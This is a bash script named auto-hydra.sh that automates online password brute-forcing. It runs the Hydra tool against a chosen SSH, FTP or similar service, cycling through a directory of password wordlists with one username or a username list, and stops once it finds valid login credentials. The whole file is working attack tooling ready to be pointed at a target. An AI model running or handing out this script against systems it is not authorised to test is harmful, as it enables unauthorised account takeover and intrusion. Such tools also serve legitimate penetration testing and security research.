#!/bin/bash

PROGRAM="auto-hydra.sh"
THREAD_NUM=4
USAGE="
usage: $PROGRAM -d PASS_WL_DIR -l|-L USERNAME|FILE -t TARGET

example:
$PROGRAM -d ~/wordlist_dir -l myuser -t 'ssh://example.com'
$PROGRAM -d ~/wordlist_dir -L logins.txt -t 'ftp://example.com'
"

show_usage()
{
  printf -- "%s" "$USAGE"
}

run_hydra_loop()
{
  # OUTFILE format
  OUTFILE="$HOME/.local/share/auto-hydra/autohydra_$(date +"%m_%d_%Y").out"
  OUTFILE_PRG="${OUTFILE}.progress"
  # Overwrite any previous versions of the files if existing
  > "$OUTFILE"
  > "$OUTFILE_PRG"
  # create log dir for OUTFILE if not existent
  [ ! -d "$(dirname "$OUTFILE")" ] && mkdir "$(dirname "$OUTFILE")"

  for file in "${wl_dir%/}"/*; do
    # Do nothing if file is not a regular readble file
    [[ -f "$file" && -r "$file" ]] || continue

    if [ -n "$target_user" ]; then
      echo hydra -l "$target_user" -P "$file" -IF -t $THREAD_NUM \
        -o "$OUTFILE" "$target_domain" | tee "$OUTFILE_PRG"
      hydra -l "$target_user" -P "$file" -IF -t $THREAD_NUM \
        -o "$OUTFILE" "$target_domain" &> "$OUTFILE_PRG"
    else
      echo hydra -L "$target_user_wl" -P "$file" -IF -t $THREAD_NUM \
        -o "$OUTFILE" "$target_domain" | tee "$OUTFILE_PRG"
      hydra -L "$target_user_wl" -P "$file" -IF -t $THREAD_NUM \
        -o "$OUTFILE" "$target_domain" &> "$OUTFILE_PRG"
    fi

    # Search for credentials in OUTFILE, and end loop if found
    echo "Searching for credentials in $OUTFILE_PRG"
    if grep -qE 'login:\s*(\S+)\s*password:\s*(\S+)' "$OUTFILE_PRG"; then
        echo "CREDENTIALS FOUND!" | tee -a "$OUTFILE"
        grep -E 'login:\s*(\S+)\s*password:\s*(\S+)' "$OUTFILE"
        exit 0
    else
        echo -e "No credentials found.\n\n"
    fi
  done
}

parse_opts()
{
  # wordlist dir
  wl_dir=""
  # target username
  target_user=""
  # target username wordlist
  target_user_wl=""
  # target domain
  target_domain=""

  while [ "$#" -gt 0 ]; do
    case "$1" in
      -h|--help) 
        show_usage 
        exit 0;;
      -d)
        wl_dir="$2"
        shift;;
      -l)
        target_user="$2"
        shift;;
      -L)
        target_user_wl="$2"
        shift;;
      -t)
        target_domain="$2"
        shift;;
      *) 
        echo "Unknown option: $1" 
        show_usage 
        exit 1;;
    esac
    shift
  done

  target_domain_regex='^[a-zA-Z0-9]+:\/\/([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9]{1,3}(\.[0-9]{1,3}){3})$'
  if [[ ! "$target_domain" =~ $target_domain_regex ]]; then
    [ -n "$target_domain" ] &&
      echo "$target_domain does not match expected format PORT://IP or PORT://DOMAIN."
    show_usage 
    exit 1
  fi

  if [ ! -d "$wl_dir" ]; then
    [ -n "$wl_dir" ] && echo "$wl_dir is not a directory."
    [ -z "$wl_dir" ] && echo "No directory specified."
    show_usage 
    exit 1
  fi

  if ! [[ -n "$target_user" || -n "$target_user_wl" ]]; then
    echo "No target username or username wordlist specified."
    show_usage
    exit 1
  fi
}

parse_opts "$@"
run_hydra_loop
